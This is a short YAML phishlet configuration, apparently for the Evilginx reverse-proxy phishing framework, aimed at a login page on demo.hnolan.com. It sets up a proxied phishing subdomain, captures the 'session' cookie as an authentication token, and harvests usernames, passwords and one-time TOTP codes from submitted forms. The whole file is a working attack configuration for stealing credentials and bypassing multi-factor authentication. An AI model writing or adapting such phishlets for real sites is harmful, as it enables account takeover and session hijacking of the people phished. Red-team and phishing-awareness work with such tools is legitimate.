min_ver: '3.0.0'
redirect_url: 'https://bank.hnolan.com'
proxy_hosts:
  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true}
auth_urls:
  - '/home'
auth_tokens:
  - domain: '.hnolan.com'
    keys: ['session']
    type: 'cookie'
    always: true
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'totp_code'
      search: '(.*)'
      type: 'post'
login:
  domain: 'demo.hnolan.com'
  path: '/'
